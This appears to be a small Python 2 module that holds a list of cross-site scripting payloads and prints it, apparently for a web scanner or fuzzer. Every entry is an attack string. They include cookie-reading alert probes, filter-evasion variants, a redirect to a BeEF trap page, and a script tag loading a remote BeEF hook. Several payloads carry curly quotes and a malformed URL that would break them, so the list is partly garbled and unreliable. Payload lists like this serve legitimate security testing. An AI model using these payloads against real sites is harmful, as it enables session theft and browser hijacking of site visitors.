# -*- coding: utf-8 -*-
"Cross-Site Scripting patterns"
xss_patterns = [
r"”><script>alert(document.cookie)</script>",
r"aaaa”><script>alert(1)</script>",
r"<script>prompt(’1’)</script>",
r"‘><script>alert(document.cookie)</script>",
r"<script>alert(‘xss’);</script>",
r"<scr<script>ipt>alert(xss)</scr</script>ipt>",
r"<script><script>alert(1)</script>",
r"<script language=”javascript”>window.location.href = ”beeftrap.html” ; </script>",
r"<script src=”http://beefhook.js”></script>",
r"<ScRiPt>alert(1)</ScRiPt>",
r"%00<script>alert(1)</script>",
r"<img onerror=alert(1) src=a>"
]

if __name__ == "__main__":
    print xss_patterns